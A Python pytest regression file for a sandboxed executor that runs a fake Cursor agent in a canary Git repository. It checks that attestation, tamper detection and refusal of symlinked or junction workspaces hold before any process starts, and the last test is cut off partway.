"""Act-2A native executor regressions; every agent process is deterministic fake code."""

from __future__ import annotations

from dataclasses import dataclass, field, replace
import hashlib
import json
import os
from pathlib import Path
import shutil
import stat
import subprocess
import sys
import re
from typing import Callable

import pytest

import admissible.delegated_gate.native_executor as native_executor
from admissible.delegated_gate.canonical import fingerprint
from admissible.delegated_gate.durability import (
    CapabilityStep,
    DurabilityCapabilityResult,
    PlatformDurabilityAdapter,
    PublicationMetadataDurability,
    PublicationVisibleButMetadataUncertain,
    DurabilityAdapterError,
)
from admissible.delegated_gate.native_canary import (
    CANARY_MISSION,
    CANARY_GATE_ID,
    EXPECTED_MATERIAL_PATHS,
    MAX_AUDITOR_INVOCATIONS,
    MAX_NATIVE_PHASE_ATTEMPTS,
    MAX_PROVIDER_INVOCATIONS,
    MAX_REPAIR_ROUNDS,
    MAX_RETRIES,
    NativeCanaryCoordinator,
    NativeCanaryStatus,
    REQUIRED_COMMIT_MESSAGE,
    build_authorization_payload,
    build_canary_repository,
    build_native_agent_prompt,
    create_canary_session,
    load_behavioral_verifier,
    main,
    run_behavioral_verifier,
    _git_source_preflight,
)
from admissible.delegated_gate.native_executor import (
    ATTESTATION_SCHEMA_VERSION,
    BACKEND_IDENTITY,
    BACKEND_PROTOCOL_VERSION,
    AtomicNativeExecutionStore,
    CursorInstallationProvenance,
    CursorNativeBackendConfig,
    CURSOR_DISCOVERY_COMMAND,
    CURSOR_DISCOVERY_MECHANISM,
    EXPECTED_CURSOR_PACKAGE_NAME,
    NativeBackendAttestation,
    NativeBackendFileAttestation,
    NativeAttemptReserved,
    NativeCanaryTerminalRecord,
    NativeCaptureTerminalStatus,
    NativeCommittedButDurabilityUncertain,
    NativeDelegatedExecutor,
    NativeEvidenceInvalid,
    NativeExecutionRequest,
    NativeExecutionEligibility,
    NativeExecutionResult,
    NativeExecutionStatus,
    NativeExecutionStoreError,
    NativeFilesystemIdentity,
    NativePreflightDecision,
    NativePreflightStatus,
    NativeProcessInvocation,
    NativeProcessObservation,
    NativeProcessOutcome,
    NativeProcessStartError,
    NativeProcessStarted,
    NativeResultIneligible,
    _NativeProcessCreationProof,
    NativeRequestAlreadyExists,
    NativeResultAlreadyExists,
    OBSERVATION_PROVEN_EMPTY,
    preflight_native_cursor,
)
from admissible.delegated_gate.state import Phase
from admissible.delegated_gate.store import AtomicDelegatedSessionStore


def _command(argv: list[str], *, cwd: Path, env: dict[str, str] | None = None) -> subprocess.CompletedProcess[str]:
    return subprocess.run(argv, cwd=cwd, env=env, shell=False, check=True, capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=60)


def _commit(repository: Path, message: str) -> None:
    env = dict(os.environ)
    env.update({"GIT_AUTHOR_NAME": "Deterministic Fake Executor", "GIT_AUTHOR_EMAIL": "fake@invalid.example", "GIT_COMMITTER_NAME": "Deterministic Fake Executor", "GIT_COMMITTER_EMAIL": "fake@invalid.example", "GIT_AUTHOR_DATE": "2026-01-02T00:00:00Z", "GIT_COMMITTER_DATE": "2026-01-02T00:00:00Z"})
    _command(["git", "add", "--all"], cwd=repository); _command(["git", "commit", "--quiet", "-m", message], cwd=repository, env=env)


def _amend_message(repository: Path, *paragraphs: str) -> None:
    env=dict(os.environ)
    env.update({"GIT_AUTHOR_NAME":"Deterministic Fake Executor","GIT_AUTHOR_EMAIL":"fake@invalid.example","GIT_COMMITTER_NAME":"Deterministic Fake Executor","GIT_COMMITTER_EMAIL":"fake@invalid.example","GIT_AUTHOR_DATE":"2026-01-02T00:00:00Z","GIT_COMMITTER_DATE":"2026-01-02T00:00:00Z"})
    argv=["git","commit","--quiet","--amend"]
    for paragraph in paragraphs: argv.extend(("-m",paragraph))
    _command(argv,cwd=repository,env=env)


def _materialize_success(repository: Path) -> None:
    (repository / "src" / "score.js").write_text("""export function normalizeScore(value) {
  if (!Number.isSafeInteger(value) || value < 0) throw new TypeError('score must be a non-negative safe integer');
  return value;
}

export function higherScore(left, right) { return Math.max(normalizeScore(left), normalizeScore(right)); }
export function loadHighScore(storage, key = 'highScore') {
  const raw = storage.getItem(key);
  return raw === null ? 0 : normalizeScore(Number(raw));
}
export function persistHighScore(storage, score, key = 'highScore') {
  const next = higherScore(loadHighScore(storage, key), score);
  storage.setItem(key, String(next));
  return next;
}
""", encoding="utf-8", newline="\n")
    (repository / "src" / "game-state.js").write_text("""import { normalizeScore, persistHighScore } from './score.js';
export function createGameState(storage) { return { score: 0, rounds: 0, highScore: persistHighScore(storage, 0) }; }
export function finishRound(state, score, storage) {
  const normalized = normalizeScore(score);
  return { score: normalized, rounds: state.rounds + 1, highScore: persistHighScore(storage, normalized) };
}
""", encoding="utf-8", newline="\n")
    (repository / "test" / "game-state.test.js").write_text("""import test from 'node:test';
import assert from 'node:assert/strict';
import { createGameState, finishRound } from '../src/game-state.js';
import { createMemoryStorage } from '../src/memory-storage.js';
test('high score persists', () => {
  const storage = createMemoryStorage();
  assert.equal(finishRound(createGameState(storage), 7, storage).highScore, 7);
});
""", encoding="utf-8", newline="\n")
    (repository / "README.md").write_text("# Canary game state\n\nHigh-score persistence is deterministic.\n", encoding="utf-8", newline="\n")
    _commit(repository, REQUIRED_COMMIT_MESSAGE)


def _mutate_without_feature(repository: Path) -> None:
    (repository / "src" / "score.js").write_text((repository / "src" / "score.js").read_text(encoding="utf-8") + "\n// unrelated\n", encoding="utf-8")
    (repository / "src" / "game-state.js").write_text((repository / "src" / "game-state.js").read_text(encoding="utf-8") + "\n// unrelated\n", encoding="utf-8")
    (repository / "test" / "game-state.test.js").write_text("import test from 'node:test'; test('weakened', () => {});\n", encoding="utf-8")
    (repository / "README.md").write_text("# unrelated\n", encoding="utf-8")
    _commit(repository, REQUIRED_COMMIT_MESSAGE)


@dataclass
class FakeNativeProcessRunner:
    mutation: Callable[[Path], None] | None = _materialize_success
    returncode: int | None = 0
    timed_out: bool = False
    cleanup_confirmed: bool = True
    orphan_process_ids: tuple[int, ...] = ()
    stdout: str = "provider prose is non-authoritative\n"
    spawn_error: bool = False
    after_start: Callable[[], None] | None = None
    invocations: list[NativeProcessInvocation] = field(default_factory=list)
    def run(self, invocation: NativeProcessInvocation) -> NativeProcessOutcome:
        self.invocations.append(invocation)
        if self.spawn_error:
            raise NativeProcessStartError("injected spawn failure")
        invocation.process_started(_NativeProcessCreationProof._after_successful_spawn(4242))
        if self.after_start: self.after_start()
        if self.mutation: self.mutation(Path(invocation.cwd))
        return NativeProcessOutcome(self.returncode, self.stdout, "", self.timed_out, self.cleanup_confirmed, OBSERVATION_PROVEN_EMPTY if self.cleanup_confirmed else "unknown", "hard_timeout" if self.timed_out else "completed", self.orphan_process_ids, len(self.stdout.encode()), 0, False, 4242)


class Clock:
    def __init__(self) -> None: self.index=0
    def __call__(self) -> str:
        value=f"2026-07-16T10:00:{self.index:02d}.000000Z"; self.index+=1; return value


@dataclass
class Harness:
    root: Path; source: Path; work: Path; evidence: Path; config: CursorNativeBackendConfig; attestation: object; runner: FakeNativeProcessRunner; store: AtomicNativeExecutionStore; session_store: AtomicDelegatedSessionStore; executor: NativeDelegatedExecutor; coordinator: NativeCanaryCoordinator; session_id: str


def _fake_cursor_launcher(path: Path) -> None:
    path.write_text("""import sys
if '--version' in sys.argv:
 print('Cursor fake 1.0'); raise SystemExit(0)
if '--help' in sys.argv:
 print('--print --force --output-format stream-json --trust --model'); raise SystemExit(0)
raise SystemExit(91)
""", encoding="utf-8")


def _fake_cursor_executable(directory: Path, *, name: str = "cursor-agent-test") -> Path:
    source = Path(sys.executable).resolve()
    executable = directory / f"{name}{source.suffix}"
    shutil.copy2(source, executable)
    return executable


def _test_identity(path: Path) -> NativeFilesystemIdentity:
    return NativeFilesystemIdentity.from_stat(os.lstat(path)).validated()


def _test_attestation(config: CursorNativeBackendConfig, installation: Path) -> NativeBackendAttestation:
    """Explicit injected attestation for deterministic executor tests only.

    It is intentionally never passed to ``preflight_native_cursor``.  The
    production preflight independently requires the host-discovered Cursor
    installation chain, so copied Python and a test launcher cannot acquire
    production-ready status.
    """

    package = installation / "package"
    manifest_path = package / "package.json"
    manifest = json.loads(manifest_path.read_text(encoding="utf-8"))
    relative = manifest["bin"][CURSOR_DISCOVERY_COMMAND]
    launcher = package / relative
    executable = package / "node.exe"
    capability = (installation / "capabilities.txt").read_bytes()
    flags = tuple(sorted(set(re.findall(rb"--[A-Za-z0-9-]+", capability))))
    advertised = tuple(item.decode("ascii") for item in flags)
    required = {"--print", "--force", "--output-format", "--trust", "--model"}
    if not required.issubset(advertised):
        raise ValueError("injected attestation lacks a required advertised argument")
    if str(executable) != config.executable or tuple(config.launcher_prefix) != (str(launcher),):
        raise ValueError("injected test attestation configuration differs from installation")
    provenance = CursorInstallationProvenance(
        discovery_mechanism=CURSOR_DISCOVERY_MECHANISM,
        discovered_shim=NativeBackendFileAttestation.observe(installation / "cursor-agent.cmd", "test shim"),
        installation_root=str(installation),
        installation_root_identity=_test_identity(installation),
        package_root=str(package),
        package_root_identity=_test_identity(package),
        package_manifest=NativeBackendFileAttestation.observe(manifest_path, "test manifest"),
        package_name=EXPECTED_CURSOR_PACKAGE_NAME,
        bin_command=CURSOR_DISCOVERY_COMMAND,
        bin_relative_path=relative,
        launcher=NativeBackendFileAttestation.observe(launcher, "test launcher"),
    ).validated()
    executable_attestation = NativeBackendFileAttestation.observe(executable, "test executable")
    launcher_prefix = (provenance.launcher,)
    argv = (executable_attestation.canonical_path, provenance.launcher.canonical_path)
    version = b"Cursor injected deterministic test runtime\n"
    provisional = NativeBackendAttestation(
        schema_version=ATTESTATION_SCHEMA_VERSION,
        backend_identity=BACKEND_IDENTITY,
        backend_protocol_version=BACKEND_PROTOCOL_VERSION,
        executable=executable_attestation,
        launcher_prefix=launcher_prefix,
        provenance=provenance,
        version_probe_argv=(*argv, "--version"),
        help_probe_argv=(*argv, "--help"),
        version_probe_exit_code=0,
        help_probe_exit_code=0,
        version_stdout_sha256=hashlib.sha256(version).hexdigest(),
        version_stderr_sha256=hashlib.sha256(b"").hexdigest(),
        help_stdout_sha256=hashlib.sha256(capability).hexdigest(),
        help_stderr_sha256=hashlib.sha256(b"").hexdigest(),
        advertised_flags=advertised,
        static_argv_template=(*argv, "--print", "--output-format", "stream-json", "--force", "--trust", "--model", config.model, "{prompt}"),
        selected_model=config.model,
        environment_allowlist=config.environment_allowlist,
        attestation_fingerprint="0" * 64,
    )
    return NativeBackendAttestation(**{**provisional.__dict__, "attestation_fingerprint": fingerprint(provisional._body())}).validated()


def _injected_test_cursor(tmp_path: Path) -> tuple[CursorNativeBackendConfig, Callable[[CursorNativeBackendConfig], NativeBackendAttestation]]:
    installation = tmp_path / "injected-test-installation"
    package = installation / "package"
    package.mkdir(parents=True)
    (installation / "cursor-agent.cmd").write_text("@rem injected test shim\n", encoding="utf-8")
    launcher = package / "index.py"
    _fake_cursor_launcher(launcher)
    executable = _fake_cursor_executable(package, name="node")
    if executable.name != "node.exe":
        executable.rename(package / "node.exe")
    (package / "package.json").write_text(json.dumps({"name": EXPECTED_CURSOR_PACKAGE_NAME, "bin": {CURSOR_DISCOVERY_COMMAND: "index.py"}}), encoding="utf-8")
    (installation / "capabilities.txt").write_text("--print --force --output-format stream-json --trust --model", encoding="utf-8")
    config = CursorNativeBackendConfig(executable=str((package / "node.exe").resolve()), launcher_prefix=(str(launcher.resolve()),))
    return config, lambda configured: _test_attestation(configured, installation)


def _harness(
    tmp_path: Path,
    *,
    runner: FakeNativeProcessRunner | None = None,
    durability_adapter: PlatformDurabilityAdapter | None = None,
) -> Harness:
    source_parent=tmp_path/"source-parent"; source_parent.mkdir(); source=build_canary_repository(source_parent,repository_name="source").repository
    root=tmp_path/"run"; root.mkdir(); work=build_canary_repository(root).repository; evidence=root/"evidence"; evidence.mkdir()
    config, attestor = _injected_test_cursor(tmp_path)
    attestation = attestor(config)
    fake=runner or FakeNativeProcessRunner(); store=AtomicNativeExecutionStore(evidence/"native-execution",durability_adapter=durability_adapter); session_store=AtomicDelegatedSessionStore(evidence/"delegated-state")
    session_id="native-canary-session"; session_store.create(create_canary_session(session_id=session_id)); executor=NativeDelegatedExecutor(config=config,process_runner=fake,clock=Clock(),local_attestor=attestor)
    coordinator=NativeCanaryCoordinator(session_store=session_store,execution_store=store,executor=executor,backend_attestation=attestation,source_repository=source,work_workspace=work,canary_parent=root,evidence_directory=evidence,timeout_seconds=30,stdout_byte_limit=4096,stderr_byte_limit=2048)
    return Harness(root,source,work,evidence,config,attestation,fake,store,session_store,executor,coordinator,session_id)


def _request(h: Harness) -> tuple[NativeExecutionRequest,str]:
    state=h.session_store.load(h.session_id); prompt=build_native_agent_prompt(mission=state.mission,gate_contract=state.current_gate,work_workspace=h.work)
    return NativeExecutionRequest.create(session_id=state.session_id,gate_id=state.current_gate.gate_id,execution_attempt_index=0,mission_fingerprint=state.mission.mission_fingerprint,gate_contract_fingerprint=state.current_gate.contract_fingerprint,work_workspace=h.work,evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,attestation=h.attestation,prompt=prompt,timeout_seconds=30,stdout_byte_limit=4096,stderr_byte_limit=2048),prompt


def test_fixture_is_deterministic_clean_one_commit_and_dependency_free(tmp_path: Path):
    left_root=tmp_path/"left"; right_root=tmp_path/"right"; left_root.mkdir(); right_root.mkdir(); left=build_canary_repository(left_root); right=build_canary_repository(right_root)
    assert left.initial_head==right.initial_head and left.initial_material_tree_hash==right.initial_material_tree_hash
    assert _command(["git","status","--porcelain=v1"],cwd=left.repository).stdout==""
    package=json.loads((left.repository/"package.json").read_text(encoding="utf-8")); assert package["scripts"]=={"test":"node --preserve-symlinks --preserve-symlinks-main --test"}; assert "dependencies" not in package


def test_local_attestation_rejects_python_plus_fake_js_launcher(tmp_path: Path):
    fake_js=tmp_path/"fake.js"; _fake_cursor_launcher(fake_js)
    decision=preflight_native_cursor(config=CursorNativeBackendConfig(executable=str(Path(sys.executable).resolve()),launcher_prefix=(str(fake_js.resolve()),)))
    assert decision.status is NativePreflightStatus.PREFLIGHT_BLOCKED


def test_missing_advertised_flag_blocks_without_provider(tmp_path: Path):
    launcher=tmp_path/"cursor.py"; launcher.write_text("import sys\nprint('--print --force --output-format stream-json --trust')\n",encoding="utf-8")
    decision=preflight_native_cursor(config=CursorNativeBackendConfig(executable=str(_fake_cursor_executable(tmp_path).resolve()),launcher_prefix=(str(launcher.resolve()),)))
    assert decision.status is NativePreflightStatus.PREFLIGHT_BLOCKED


def test_actual_local_cursor_installation_without_manifest_bin_chain_fails_closed() -> None:
    shim=shutil.which("cursor-agent")
    if shim is None:
        pytest.skip("Cursor Agent is not locally installed")
    installation=Path(shim).resolve().parent
    versions=installation/"versions"
    candidates=sorted((item for item in versions.iterdir() if item.is_dir()),key=lambda item:item.name) if versions.is_dir() else []
    if not candidates or not (candidates[-1]/"node.exe").is_file() or not (candidates[-1]/"index.js").is_file():
        pytest.skip("local Cursor distribution has no inspectable Node runtime layout")
    package=candidates[-1]
    decision=preflight_native_cursor(config=CursorNativeBackendConfig(executable=str((package/"node.exe").resolve()),launcher_prefix=(str((package/"index.js").resolve()),)))
    # This local distribution currently declares its runtime package name but
    # no manifest bin mapping.  It must block before any version/help process.
    assert decision.status is NativePreflightStatus.PREFLIGHT_BLOCKED
    assert "bin" in decision.detail.lower()


@pytest.mark.parametrize("manifest, launcher_name", [
    ({"name": EXPECTED_CURSOR_PACKAGE_NAME, "bin": {CURSOR_DISCOVERY_COMMAND: "other.py"}}, "index.py"),
    ({"name": EXPECTED_CURSOR_PACKAGE_NAME, "bin": {CURSOR_DISCOVERY_COMMAND: "index.py"}}, "outside.py"),
    ({"name": "cursor-looking-fake", "bin": {CURSOR_DISCOVERY_COMMAND: "index.py"}}, "index.py"),
])
def test_production_preflight_rejects_fake_manifest_and_launcher_chains(tmp_path: Path, manifest: dict[str, object], launcher_name: str):
    package=tmp_path/"fake-package"; package.mkdir(); launcher=package/launcher_name; _fake_cursor_launcher(launcher)
    (package/"package.json").write_text(json.dumps(manifest),encoding="utf-8")
    decision=preflight_native_cursor(config=CursorNativeBackendConfig(executable=str(_fake_cursor_executable(package,name="node").resolve()),launcher_prefix=(str(launcher.resolve()),)))
    assert decision.status is NativePreflightStatus.PREFLIGHT_BLOCKED


def test_request_round_trip_is_attestation_bound_and_attempt_one_is_rejected(tmp_path: Path):
    h=_harness(tmp_path); request,_=_request(h); assert NativeExecutionRequest.from_dict(json.loads(json.dumps(request.to_dict())))==request
    raw=request.to_dict(); raw["execution_attempt_index"]=1; raw["request_fingerprint"]=fingerprint({key:value for key,value in raw.items() if key!="request_fingerprint"})
    with pytest.raises(ValueError): NativeExecutionRequest.from_dict(raw)


def test_production_native_request_is_durable_reloaded_and_never_overwritten(tmp_path: Path):
    h=_harness(tmp_path); request,_=_request(h)
    h.store.create_request(request)
    path=h.store._path("request",request.session_id,request.gate_id,0)
    original=path.read_bytes()
    assert h.store.load_request(request.session_id,request.gate_id,0)==request
    with pytest.raises(NativeRequestAlreadyExists): h.store.create_request(request)
    assert path.read_bytes()==original


def test_inert_request_parse_needs_fresh_local_attestation_before_execution(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); raw=request.to_dict()
    attestation=raw["backend_attestation"]
    attestation["advertised_flags"]= ["--alternate", "--force", "--model", "--output-format", "--print", "--trust"]
    attestation["attestation_fingerprint"]=fingerprint({key:value for key,value in attestation.items() if key!="attestation_fingerprint"})
    raw["backend_attestation_fingerprint"]=attestation["attestation_fingerprint"]
    raw["request_fingerprint"]=fingerprint({key:value for key,value in raw.items() if key!="request_fingerprint"})
    parsed=NativeExecutionRequest.from_dict(raw)
    with pytest.raises(NativeEvidenceInvalid,match="freshly attested"):
        parsed.validated_for_execution(current_attestation=h.attestation)
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=parsed,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,required_commit_message=REQUIRED_COMMIT_MESSAGE,required_material_paths=EXPECTED_MATERIAL_PATHS,execution_store=h.store)
    assert h.runner.invocations==[]


def test_substituted_manifest_or_launcher_identity_cannot_reload_as_authority(tmp_path: Path):
    h=_harness(tmp_path); request,_=_request(h); raw=request.to_dict(); manifest=tmp_path/"injected-test-installation"/"package"/"package.json"
    manifest.write_text(json.dumps({"name":"wrong-package","bin":{CURSOR_DISCOVERY_COMMAND:"index.py"}}),encoding="utf-8")
    with pytest.raises(ValueError): NativeExecutionRequest.from_dict(raw)
    # Restore a structurally valid manifest, then prove a changed mapped
    # launcher is likewise rejected before an executor can be entered.
    manifest.write_text(json.dumps({"name":EXPECTED_CURSOR_PACKAGE_NAME,"bin":{CURSOR_DISCOVERY_COMMAND:"index.py"}}),encoding="utf-8")
    Path(h.config.launcher_prefix[0]).write_text("print('substituted launcher')\n",encoding="utf-8")
    with pytest.raises(ValueError): NativeExecutionRequest.from_dict(raw)


def test_changed_launcher_before_spawn_blocks_without_fake_process(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); Path(h.attestation.launcher_prefix[0].canonical_path).write_text("print('changed')\n",encoding="utf-8")
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,required_commit_message=REQUIRED_COMMIT_MESSAGE,required_material_paths=EXPECTED_MATERIAL_PATHS,execution_store=h.store)
    assert h.runner.invocations==[]


def test_changed_help_capability_evidence_blocks_before_spawn(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h)
    (tmp_path/"injected-test-installation"/"capabilities.txt").write_text("--print --output-format stream-json --trust --model",encoding="utf-8")
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,required_commit_message=REQUIRED_COMMIT_MESSAGE,required_material_paths=EXPECTED_MATERIAL_PATHS,execution_store=h.store)
    assert h.runner.invocations==[]


def test_changed_copied_executable_after_request_blocks_when_platform_can_launch_copy(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); executable=Path(h.config.executable); executable.write_bytes(executable.read_bytes()+b"x")
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,required_commit_message=REQUIRED_COMMIT_MESSAGE,required_material_paths=EXPECTED_MATERIAL_PATHS,execution_store=h.store)
    assert h.runner.invocations==[]


def test_plain_deserialized_and_lookalike_results_cannot_be_written(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); h.store.create_request(request)
    with pytest.raises(NativeEvidenceInvalid,match="executor-issued"):
        h.store.write_result(object())
    issued=h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,required_commit_message=REQUIRED_COMMIT_MESSAGE,required_material_paths=EXPECTED_MATERIAL_PATHS,execution_store=h.store)
    result=h.store.write_result(issued); assert result.status is NativeExecutionStatus.PROCESS_SUCCEEDED
    with pytest.raises(NativeEvidenceInvalid): h.store.write_result(issued)
    with pytest.raises(Exception): h.store.create_request(request)


def test_recomputed_contradictory_result_is_rejected(tmp_path: Path):
    h=_harness(tmp_path); outcome=h.coordinator.run(session_id=h.session_id); assert outcome.canary_success
    result=h.store.load_result(h.session_id,"native-canary-gate",0); raw=result.to_dict(); raw["source_tree_hash_after"]="f"*64; raw["source_repository_mutated"]=False
    raw["result_fingerprint"]=fingerprint({key:value for key,value in raw.items() if key!="result_fingerprint"})
    with pytest.raises(ValueError,match="source mutation flag"):
        NativeExecutionResult.from_dict(raw)


@pytest.mark.parametrize(("field", "value", "message"), [
    ("commits_added", 0, "commit count"),
    ("changed_material_files", [], "changed paths"),
    ("final_commit_message", "contradictory message", "final workspace/Git"),
])
def test_self_fingerprinted_git_success_claims_are_recomputed(tmp_path: Path, field: str, value: object, message: str):
    h=_harness(tmp_path); request,prompt=_request(h); h.store.create_request(request)
    result=h.store.write_result(h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,required_commit_message=REQUIRED_COMMIT_MESSAGE,required_material_paths=EXPECTED_MATERIAL_PATHS,execution_store=h.store))
    raw=result.to_dict(); raw[field]=value; raw["result_fingerprint"]=fingerprint({key:item for key,item in raw.items() if key!="result_fingerprint"})
    with pytest.raises(ValueError,match=message): NativeExecutionResult.from_dict(raw)


def test_workspace_git_change_after_result_publication_fails_reloaded_authority(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); h.store.create_request(request)
    h.store.write_result(h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,required_commit_message=REQUIRED_COMMIT_MESSAGE,required_material_paths=EXPECTED_MATERIAL_PATHS,execution_store=h.store))
    (h.work/"README.md").write_text("changed after result\n",encoding="utf-8")
    with pytest.raises(NativeEvidenceInvalid,match="invalid"):
        h.store.load_result(h.session_id,"native-canary-gate",0)


def test_result_artifact_tamper_and_escape_fail_closed(tmp_path: Path):
    h=_harness(tmp_path); assert h.coordinator.run(session_id=h.session_id).canary_success; result=h.store.load_result(h.session_id,"native-canary-gate",0)
    artifact=h.store.directory/result.stdout_artifact.relative_path; artifact.write_bytes(artifact.read_bytes()+b"tamper")
    with pytest.raises(NativeEvidenceInvalid,match="hash"):
        h.store.load_result(h.session_id,"native-canary-gate",0)


def test_symlinked_workspace_and_source_workspace_are_refused(tmp_path: Path):
    h=_harness(tmp_path)
    link=tmp_path/"work-link"
    try: os.symlink(h.work,link,target_is_directory=True)
    except (OSError,NotImplementedError): pytest.skip("symlinks unavailable")
    state=h.session_store.load(h.session_id)
    with pytest.raises(ValueError): NativeExecutionRequest.create(session_id=state.session_id,gate_id=state.current_gate.gate_id,execution_attempt_index=0,mission_fingerprint=state.mission.mission_fingerprint,gate_contract_fingerprint=state.current_gate.contract_fingerprint,work_workspace=link,evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,attestation=h.attestation,prompt=build_native_agent_prompt(mission=state.mission,gate_contract=state.current_gate,work_workspace=h.work),timeout_seconds=30,stdout_byte_limit=10,stderr_byte_limit=10)
    request,prompt=_request(h)
    with pytest.raises(NativeEvidenceInvalid): h.executor.execute(request=request,prompt=prompt,source_repository=h.work,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,required_commit_message=REQUIRED_COMMIT_MESSAGE,required_material_paths=EXPECTED_MATERIAL_PATHS,execution_store=h.store)


def test_real_windows_junction_workspace_and_evidence_root_are_refused(tmp_path: Path):
    if os.name != "nt": pytest.skip("Windows junction regression")
    h=_harness(tmp_path); junction=tmp_path/"junction"
    completed=subprocess.run(["cmd.exe","/d","/c","mklink","/J",str(junction),str(h.work)],shell=False,capture_output=True)
    if completed.returncode != 0: pytest.skip("junction creation unavailable")
    state=h.session_store.load(h.session_id); prompt=build_native_agent_prompt(mission=state.mission,gate_contract=state.current_gate,work_workspace=h.work)
    with pytest.raises(ValueError): NativeExecutionRequest.create(session_id=state.session_id,gate_id=state.current_gate.gate_id,execution_attempt_index=0,mission_fingerprint=state.mission.mission_fingerprint,gate_contract_fingerprint=state.current_gate.contract_fingerprint,work_workspace=junction,evidence_store_root=h.store.directory,artifact_directory=h.store.artifact_directory,attestation=h.attestation,prompt=prompt,timeout_seconds=30,stdout_byte_limit=10,stderr_byte_limit=10)
    evidence_link=tmp_path/"evidence-junction"; completed=subprocess.run(["cmd.exe","/d","/c","mklink","/J",str(evidence_link),str(h.evidence)],shell=False,capture_output=True)
    if completed.returncode == 0:
        with pytest.raises(ValueError): AtomicNativeExecutionStore(evidence_link/"store")


def test_redirecting_artifact_destination_blocks_before_fake_process(tmp_path: Path):
    h=_harness(tmp_path); destination=h.store.directory/"redirecting-artifacts"
    try: destination.symlink_to(tmp_path,target_is_directory=True)
    except (OSError,NotImplementedError): pytest.skip("symlinks unavailable")
    request,prompt=_request(h)
    with pytest.raises(ValueError):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=h.store.directory,artifact_directory=destination,required_commit_message=REQUIRED_COMMIT_MESSAGE,required_material_paths=EXPECTED_MATERIAL_PATHS,execution_store=h.store)
    assert h.runner.invocations==[]


@pytest.mark.parametrize("kind", ["outside", "sibling", "workspace"])
def test_artifact_root_is_bound_and_rejected_before_request_or_process(tmp_path: Path, kind: str):
    h=_harness(tmp_path); state=h.session_store.load(h.session_id); prompt=build_native_agent_prompt(mission=state.mission,gate_contract=state.current_gate,work_workspace=h.work)
    if kind == "outside":
        artifact=tmp_path/"outside"; artifact.mkdir()
    elif kind == "sibling":
        artifact=h.store.directory.parent/"sibling-artifacts"; artifact.mkdir()
    else:
        artifact=h.work/"agent-artifacts"; artifact.mkdir()
    with pytest.raises((ValueError,NativeEvidenceInvalid)):
        NativeExecutionRequest.create(session_id=state.session_id,gate_id=state.current_gate.gate_id,execution_attempt_index=0,mission_fingerprint=state.mission.mission_fingerprint,gate_contract_fingerprint=state.current_gate.contract_fingerprint,work_workspace=h.work,evidence_store_root=h.store.directory,artifact_directory=artifact,attestation=h.attestation,prompt=prompt,timeout_seconds=30,stdout_byte_limit=1024,stderr_byte_limit=1024)
    assert h.runner.invocations==[]


def test_evidence_root_replacement_blocks_before_fake_process(tmp_path: Path):
    h=_harness(tmp_path); request,prompt=_request(h); h.store.create_request(request)
    original=h.store.directory; displaced=original.parent/"displaced-native-evidence"; original.rename(displaced); original.mkdir(); (original/"artifacts").mkdir()
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(request=request,prompt=prompt,source_repository=h.source,canary_parent=h.root,allowed_parent_children=frozenset({h.work.name}),evidence_store_root=original,artifact_directory=original/"artifacts",required_commit_message=REQUIRED_COMMIT_MESSAGE,required_material_paths=EXPECTED_MATERIAL_PATHS,execution_store=h.store)
    assert h.runner.invocations==[]


def test_nested_existing_sibling_mutation_is_detected(tmp_path: Path):
    h=_harness(tmp_path); sibling=h.root/"sibling"; sibling.mkdir(); (sibling/"inside.txt").write_text("before",encoding="utf-8")
    def mutate(work: Path) -> None: _materialize_success(work); (sibling/"inside.txt").write_text("after",encoding="utf-8")
    h.runner.mutation=mutate; outcome=h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED and h.session_store.load(h.session_id).phase is Phase.GATE_EXECUTING


def test_directory_durability_uncertainty_blocks_before_provider(tmp_path: Path):
    class UncertainAfterPublication(PlatformDurabilityAdapter):
        def publish(self, final_path, data, *, mode, replacement_authority=None):
            result=super().publish(final_path,data,mode=mode,replacement_authority=replacement_authority)
            raise PublicationVisibleButMetadataUncertain(
                "injected metadata durability uncertainty",
                path=Path(final_path),
                file_content_durable=True,
                publication_visible=True,
                metadata_status=PublicationMetadataDurability.PUBLICATION_METADATA_UNCERTAIN,
            )
    h=_harness(tmp_path,durability_adapter=UncertainAfterPublication()); outcome=h.coordinator.run(session_id=h.session_id)
